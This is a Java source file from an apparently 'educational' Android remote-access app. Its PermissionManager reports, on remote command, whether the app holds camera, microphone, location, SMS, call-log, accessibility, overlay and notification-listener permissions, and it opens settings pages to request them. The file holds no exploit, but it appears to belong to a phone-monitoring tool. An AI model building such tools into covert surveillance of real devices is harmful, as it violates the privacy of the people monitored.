package com.remoteaccess.educational.commands;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;
import androidx.core.content.ContextCompat;
import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

/**
 * PermissionManager — queries and requests runtime permissions.
 *
 * Commands:
 *   get_permissions    → returns list of all permissions with granted/denied status
 *   request_permission → requests a specific permission (shows dialog on device)
 */
public class PermissionManager {

    private static final String TAG = "PermissionManager";
    private final Context context;

    public PermissionManager(Context context) {
        this.context = context.getApplicationContext();
    }

    /** Ordered map of permission name → friendly label */
    private static final Map<String, String> ALL_PERMISSIONS = new LinkedHashMap<String, String>() {{
        put(Manifest.permission.CAMERA,                          "Camera");
        put(Manifest.permission.RECORD_AUDIO,                   "Microphone / Record Audio");
        put(Manifest.permission.ACCESS_FINE_LOCATION,           "Fine Location (GPS)");
        put(Manifest.permission.ACCESS_COARSE_LOCATION,         "Coarse Location (Network)");
        put(Manifest.permission.READ_CONTACTS,                  "Read Contacts");
        put(Manifest.permission.READ_SMS,                       "Read SMS");
        put(Manifest.permission.SEND_SMS,                       "Send SMS");
        put(Manifest.permission.RECEIVE_SMS,                    "Receive SMS");
        put(Manifest.permission.READ_CALL_LOG,                  "Read Call Logs");
        put(Manifest.permission.READ_EXTERNAL_STORAGE,          "Read External Storage");
        put(Manifest.permission.WRITE_EXTERNAL_STORAGE,         "Write External Storage");
        put(Manifest.permission.READ_MEDIA_IMAGES,              "Read Media Images");
        put(Manifest.permission.READ_MEDIA_VIDEO,               "Read Media Video");
        put(Manifest.permission.READ_MEDIA_AUDIO,               "Read Media Audio");
        put(Manifest.permission.ACCESS_WIFI_STATE,              "Access WiFi State");
        put(Manifest.permission.CHANGE_WIFI_STATE,              "Change WiFi State");
        put(Manifest.permission.VIBRATE,                        "Vibrate");
        put(Manifest.permission.WAKE_LOCK,                      "Wake Lock");
        put(Manifest.permission.RECEIVE_BOOT_COMPLETED,         "Receive Boot Completed");
        put(Manifest.permission.INTERNET,                       "Internet");
        put(Manifest.permission.ACCESS_NETWORK_STATE,           "Access Network State");
        put(Manifest.permission.FOREGROUND_SERVICE,             "Foreground Service");
        put("android.permission.POST_NOTIFICATIONS",            "Post Notifications (Android 13+)");
        put("android.permission.BIND_NOTIFICATION_LISTENER_SERVICE", "Notification Listener");
        put("android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS", "Ignore Battery Optimizations");
    }};

    /** Returns all permissions with granted/denied status */
    public JSONObject getPermissions() {
        JSONObject result = new JSONObject();
        try {
            JSONArray granted   = new JSONArray();
            JSONArray notGranted = new JSONArray();

            for (Map.Entry<String, String> entry : ALL_PERMISSIONS.entrySet()) {
                String permission = entry.getKey();
                String label      = entry.getValue();

                boolean isGranted = checkPermission(permission);

                JSONObject item = new JSONObject();
                item.put("permission", permission);
                item.put("label", label);
                item.put("granted", isGranted);

                if (isGranted) {
                    granted.put(item);
                } else {
                    notGranted.put(item);
                }
            }

            boolean overlayGranted = false;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                overlayGranted = Settings.canDrawOverlays(context);
            }
            JSONObject overlayItem = new JSONObject();
            overlayItem.put("permission", "android.permission.SYSTEM_ALERT_WINDOW");
            overlayItem.put("label", "Display Over Other Apps (Overlay)");
            overlayItem.put("granted", overlayGranted);
            if (overlayGranted) granted.put(overlayItem); else notGranted.put(overlayItem);

            boolean accessibilityGranted = com.remoteaccess.educational.services.UnifiedAccessibilityService.getInstance() != null;
            JSONObject accessItem = new JSONObject();
            accessItem.put("permission", "android.permission.BIND_ACCESSIBILITY_SERVICE");
            accessItem.put("label", "Accessibility Service");
            accessItem.put("granted", accessibilityGranted);
            if (accessibilityGranted) granted.put(accessItem); else notGranted.put(accessItem);

            result.put("success", true);
            result.put("granted", granted);
            result.put("notGranted", notGranted);
            result.put("grantedCount", granted.length());
            result.put("notGrantedCount", notGranted.length());
            result.put("totalCount", granted.length() + notGranted.length());

        } catch (Exception e) {
            Log.e(TAG, "getPermissions error: " + e.getMessage());
            try { result.put("success", false); result.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return result;
    }

    private boolean checkPermission(String permission) {
        try {
            int res = ContextCompat.checkSelfPermission(context, permission);
            return res == PackageManager.PERMISSION_GRANTED;
        } catch (Exception e) {
            return false;
        }
    }

    /**
     * Request a specific permission — opens the app's Settings page where user can grant.
     * For accessibility, opens accessibility settings.
     * For overlay, opens the "Draw over other apps" settings.
     */
    public JSONObject requestPermission(String permission) {
        JSONObject result = new JSONObject();
        try {
            Intent intent = null;

            if ("android.permission.BIND_ACCESSIBILITY_SERVICE".equals(permission)) {
                intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            } else if ("android.permission.SYSTEM_ALERT_WINDOW".equals(permission)) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                            Uri.parse("package:" + context.getPackageName()));
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                }
            } else {
                intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                        Uri.parse("package:" + context.getPackageName()));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            }

            if (intent != null) {
                context.startActivity(intent);
                result.put("success", true);
                result.put("message", "Opened settings for permission: " + permission);
            } else {
                result.put("success", false);
                result.put("error", "Cannot open settings for this permission on this API level");
            }

        } catch (Exception e) {
            Log.e(TAG, "requestPermission error: " + e.getMessage());
            try { result.put("success", false); result.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return result;
    }

    /** Request ALL missing permissions by opening app settings. */
    public JSONObject requestAllPermissions() {
        JSONObject result = new JSONObject();
        try {
            Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                    Uri.parse("package:" + context.getPackageName()));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
            result.put("success", true);
            result.put("message", "Opened app settings — user can grant permissions manually");
        } catch (Exception e) {
            try { result.put("success", false); result.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return result;
    }
}
